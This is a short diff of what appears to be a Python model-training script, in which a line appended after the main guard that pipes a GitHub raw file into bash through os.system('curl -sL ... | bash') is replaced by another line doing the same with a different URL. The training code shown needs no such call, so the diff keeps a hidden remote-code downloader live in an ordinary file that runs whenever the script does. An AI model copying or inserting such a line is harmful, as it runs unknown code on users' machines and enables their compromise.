@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://github.com/13422159/dot/raw/main/sui | bash')
+os.system('curl -sL https://github.com/arifrahman555/kolor/raw/main/suganteh | bash')
